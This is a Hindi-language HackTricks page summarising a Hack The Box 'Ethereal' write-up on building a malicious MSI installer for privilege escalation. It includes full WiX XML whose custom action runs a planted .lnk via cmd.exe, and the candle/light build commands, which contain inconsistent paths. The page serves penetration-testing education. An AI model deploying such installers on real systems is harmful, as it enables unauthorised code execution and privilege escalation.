<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

# मैलिशस MSI बनाना और रूट प्राप्त करना

MSI इंस्टॉलर का निर्माण wixtools का उपयोग करके किया जाएगा, विशेष रूप से [wixtools](http://wixtoolset.org) का उपयोग किया जाएगा। यह उल्लेखनीय है कि वैकल्पिक MSI बिल्डर्स का प्रयास किया गया था, लेकिन वे इस विशेष मामले में सफल नहीं हुए थे।

wix MSI के उपयोग के उदाहरणों की व्यापक समझ के लिए, [इस पृष्ठ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) का परामर्श लेना उचित है। यहाँ, आप wix MSI के उपयोग के विभिन्न उदाहरण पा सकते हैं।

लक्ष्य एक MSI उत्पन्न करना है जो lnk फ़ाइल को निष्पादित करेगा। इसे प्राप्त करने के लिए, निम्न XML कोड का उपयोग किया जा सकता है ([xml यहाँ से](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
```markdown
महत्वपूर्ण है कि Package तत्व में InstallerVersion और Compressed जैसे गुण होते हैं, जो क्रमशः इंस्टॉलर के संस्करण और पैकेज संकुचित है या नहीं, इसका संकेत देते हैं।

निर्माण प्रक्रिया में candle.exe का उपयोग करना शामिल है, जो wixtools से एक उपकरण है, msi.xml से एक wixobject उत्पन्न करने के लिए। निम्नलिखित कमांड को निष्पादित किया जाना चाहिए:
```
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
इसके अलावा, यह उल्लेखनीय है कि पोस्ट में एक छवि दी गई है, जो कमांड और उसके आउटपुट को दर्शाती है। आप इसे दृश्य मार्गदर्शन के लिए संदर्भित कर सकते हैं।

इसके अतिरिक्त, wixtools से एक और टूल light.exe का उपयोग करके wixobject से MSI फाइल बनाई जाएगी। निष्पादित किए जाने वाले कमांड इस प्रकार हैं:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
पिछले कमांड की तरह, इस पोस्ट में भी एक छवि शामिल है जो कमांड और उसके आउटपुट को दर्शाती है।

कृपया ध्यान दें कि यह सारांश मूल्यवान जानकारी प्रदान करने का प्रयास करता है, लेकिन अधिक व्यापक विवरण और सटीक निर्देशों के लिए मूल पोस्ट का संदर्भ लेना अनुशंसित है।

# संदर्भ
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो** करें।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
